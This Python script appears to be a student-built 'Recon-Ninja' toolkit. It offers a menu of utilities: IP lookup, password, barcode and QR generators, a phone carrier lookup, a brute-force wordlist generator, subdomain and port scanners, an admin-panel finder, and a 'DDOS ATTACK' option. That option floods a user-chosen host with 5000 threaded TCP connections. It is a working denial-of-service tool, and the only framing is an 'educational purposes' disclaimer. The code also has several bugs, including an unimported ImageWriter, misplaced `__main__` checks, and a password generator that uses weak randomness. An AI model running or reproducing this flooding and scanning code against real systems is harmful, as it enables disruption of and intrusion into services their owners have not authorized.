import os
import time
import random
import itertools
import requests
import queue
import socket
import threading
from pathlib import Path
from tqdm import tqdm
from pyfiglet import Figlet
import barcode #comment this if your terminal doesn't support barcode module
#from barcode import EAN13  #comment this if your terminal doesn't support barcode module
#import zbar
from barcode import EAN13
from phonenumbers import carrier, parse
from phonenumbers.phonenumberutil import region_code_for_number
import pyqrcode
import tabulate

print('\n\033[1mWarning: "This tool is not an official ethical hacking or cybersecurity tool & is nothing but an internship project built by a student at 1Stop.ai".\n\nUse for EDUCATIONAL PURPOSES ONLY.\n\nThis is an UNLICENSED FREEWARE.\n\033[0m')



def banner():
    f = Figlet(font="slant")
    result = f.renderText("Recon-Ninja V1.0")
    print(result)

def generate_random_banner():
    messages = [
        "Welcome to Recon-Ninja V1.0",
        "Initializing Recon-Ninja V1.0",
        "Recon-Ninja V1.0 is ready!",
        "Recon-Ninja V1.0 - Happy Finding Intel!",
        "Recon-Ninja V1.0 - Your Ultimate Recon Companion",
        "Recon-Ninja V1.0 - Do people even read this?",
        "Recon-Ninja V1.0 - Built by a Random Teen Geek",
        "Recon-Ninja V1.0 - I Love Whey Protein and CyberSecurity",
    ]
    message = random.choice(messages)
    f = Figlet(font='mini')
    random_banner = f.renderText(message)
    print(random_banner)

def print_options():
    print("Select a task:")
    print("1- MY IP ADDRESS")
    print("2- PASSWORD GENERATOR")
    print("3- WORDLIST GENERATOR")
    print("4- BARCODE GENERATOR")
    print("5- QRCODE GENERATOR")
    print("6- PHONE NUMBER INFO")
    print("7- SUBDOMAIN SCANNER")
    print("8- PORT SCANNER")
    print("9- DDOS ATTACK")
    print("10- ADMIN PANEL FINDER")

    print("\nPress 'Crtl+C' to interrupt and exit immediately.\n")

def get_user_choice():
    select = input("Enter your choice: ")
    return int(select)

def my_ip():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("MY IP"))
        loading()
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        print("Your IP Address is: " + IPAddr)

def password_generator():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con:cols={columns} lines={height}')

    def get_random_string(length):
        lower = "abcdefghijklmnopqrstuvwxyz"
        upper = "ABCDEFGHIJKLMNOPQRSTUVXYZ"
        numbers = "1234567890"
        symbols = "@#&*(){}[]/?"
        all_chars = lower + symbols + numbers + upper
        password = ''.join(random.sample(all_chars, length))
        return password

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PASSWORD GENERATOR"))
        loading()
        length = int(input("Enter the length of the password: "))
        password = get_random_string(length)
        print("Generated Password: " + password)

def wordlist_generator():
    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("WORDLIST GENERATOR"))

        chrs = input("Enter the characters for combination: ")
        minimum_length = int(input("Minimum length of password: "))
        maximum_length = int(input("Maximum length of password: "))
        num_passwords = int(input("Number of passwords to generate: "))

        print("Generating passwords...")
        limit = num_passwords

        # Generate passwords
        passwords = []
        for _ in range(limit):
            for length in range(minimum_length, maximum_length + 1):
                for xs in itertools.product(chrs, repeat=length):
                    passwords.append(''.join(xs))
                    num_passwords -= 1
                    if num_passwords == 0:
                        break
                if num_passwords == 0:
                    break
            if num_passwords == 0:
                break

        # Get the default download location
        download_location = os.path.join(os.path.expanduser('~'), "Downloads")

        # Save passwords in a text file
        file_path = os.path.join(download_location, "wordlist.txt")
        with open(file_path, "w") as file:
            file.write("\n".join(passwords))

        print(f"{len(passwords)} passwords generated and saved at: {file_path}")

def barcode_generator():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("BARCODE GENERATOR"))
        loading()
        number = input("Enter 12 digit number to generate barcode: ")
        my_code = EAN13(number, writer=ImageWriter())
        download_directory = os.path.join(os.path.expanduser('~'), "Downloads")
        file_path = os.path.join(download_directory, "barcode.png")
        my_code.save(file_path)
        print(f"Barcode image saved at: {file_path}")

def qrcode_generator():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...",ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=80, height=20):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("QRCODE GENERATOR"))
        loading()
        s = input("Enter the link or text to create a QR Code: ")

        # Get Downloads directory path
        downloads_dir = Path.home() / "Downloads"

        # Create QR code
        url = pyqrcode.create(s)

        # Save as SVG
        svg_path = downloads_dir / "myqr.svg"
        url.svg(svg_path, scale=8)

        # Save as PNG
        png_path = downloads_dir / "myqr.png"
        url.png(png_path, scale=6)

        print(f"QR code saved at: {svg_path}\nAnd also at: {png_path}")

def phone_number_info():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    def num_scanner(phn_num):
        number = parse(phn_num)
        description = region_code_for_number(number)
        supplier = carrier.name_for_number(number, 'en')
        info = [["Country", "Supplier"], [description, supplier]]
        data = tabulate.tabulate(info, headers=["", ""], tablefmt="github")
        return data

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PHONE NUMBER INFO"))
        loading()
        number = input("Enter the phone number in E.164 format:")
        print(num_scanner(number))

def subdomain_scanner():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    def eta_press(iterable, desc="", total=None):
        if total is None:
            try:
                total = len(iterable)
            except TypeError:
                pass
        return tqdm(iterable, desc=desc, total=total, ascii=False, ncols=75)

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("SUBDOMAIN SCANNER"))
        loading()
        print("\n")
        print("The subdomains discovered depends upon the 'subdomains.txt' file used. \nFor more accurate results try adding more keywords in the file or use a different 'subdomains.txt' file.\n")
        domain = input("Enter the domain to scan: ")

        subdomains_files = [os.path.join(root, file) for root, dirs, files in os.walk('/') for file in files if file == 'subdomains.txt']
        print("\nIt takes atleast 30 seconds to start the process")
        print("Please wait while we fetch the data for you...")
        if subdomains_files:
            with open(subdomains_files[0], 'r') as file:
                content = file.read()
                subdomains = content.splitlines()
                for subdomain in eta_press(subdomains, desc="Scanning Subdomains"):
                    url = f"http://{subdomain}.{domain}"
                    try:
                        requests.get(url)
                    except requests.ConnectionError:
                        pass
                    else:
                        print(f"Discovered subdomain: {url}")
        else:
            print("No 'subdomains.txt' file found in the system.")

def port_scanner():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PORT SCANNER"))
        loading()
        print("Keep some patience, it takes time according to the open ports and provided IP")
        target = input("Enter the IP address to scan: ")
        open_ports = []

        def portscan(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(1)  # Set a timeout to avoid hanging
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        open_ports.append(port)
            except socket.error:
                pass

        def get_ports(mode, pbar_scan):
            if mode == 1:
                for port in pbar_scan:
                    portscan(port)
            elif mode == 2:
                for port in pbar_scan:
                    portscan(port)
            elif mode == 3:
                for port in pbar_scan:
                    portscan(port)
            elif mode == 4:
                for port in pbar_scan:
                    portscan(port)

        def run_scanner(threads, mode):
            pbar_scan = tqdm(range(1, 1024), desc="Scanning Ports", ascii=False, ncols=75)
            get_ports(mode, pbar_scan)
            pbar_scan.close()
            print("Open ports are:", open_ports)

        run_scanner(100, 1)

def ddos_attack():
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    def attack(target_ip, port, pbar):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        except socket.gaierror:
            print("Couldn't resolve hostname or IP address. Exiting.")
            return
        except Exception as e:
            pass
        pbar.update(1)

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("DDOS ATTACK"))
        loading()
        target = input("Enter the IP address or the website URL: ")
        port = int(input("Enter the port: "))

        try:
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            print("Couldn't resolve hostname or IP address. Exiting.")
            return

        pbar = tqdm(desc="Attacking", total=5000, ascii=False, ncols=75)
        threads = []
        for _ in range(5000):
            t = threading.Thread(target=attack, args=(target_ip, port, pbar))
            t.daemon = True  # Daemonize the thread to exit with main pslantram
            t.start()
            threads.append(t)

        try:
            for t in threads:
                t.join()  # Wait for all threads to complete
        except KeyboardInterrupt:
            print("Attack interrupted.")
            pbar.close()
            return

        pbar.close()
        print("Completed")



def scan_admin_panel(domain):
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)
        print("LETS MOVE")

    def font(text):
        cool_text = Figlet(font="mini")
        return str(cool_text.renderText(text))

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if not domain.startswith("http://") and not domain.startswith("https://"):
          domain = "http://" + domain

    admin_panel_keywords = [
        "admin", "administrator", "wp-admin", "login", "panel", "cpanel", "webmin", "directadmin", "manager", "moderator", "portal", "secure", "shell", "signin", "signon"
    ]

    discovered_urls = set()

    print(f"Scanning URLs for '{domain}':")
    for keyword in admin_panel_keywords:
        url = f"{domain}/{keyword}"
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                discovered_urls.add(url)
                print(f"Possible admin panel URL found: {url}")

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    print("Scanning complete. Discovered URLs:")
    for url in discovered_urls:
        print(url)

    
    
banner()
generate_random_banner()
print_options()

choice = get_user_choice()

while True:
    if choice == 1:
        my_ip()
    elif choice == 2:
        password_generator()
    elif choice == 3:
        wordlist_generator()
    elif choice == 4:
        barcode_generator()
    elif choice == 5:
        qrcode_generator()
    elif choice == 6:
        phone_number_info()
    elif choice == 7:
        subdomain_scanner()
    elif choice == 8:
        port_scanner()
    elif choice == 9:
        ddos_attack()
    elif choice == 10:
        domain = input("Enter the domain name of the website: ")
        scan_admin_panel(domain)
    else:
        print("Invalid choice")

    user_input = input("Do you want to continue? (y/n): ")
    if user_input.lower() == 'n':
        break
    elif user_input.lower() != 'y':
        print("Invalid input. Please enter 'y' or 'n'.")
    print_options()
    choice = get_user_choice()
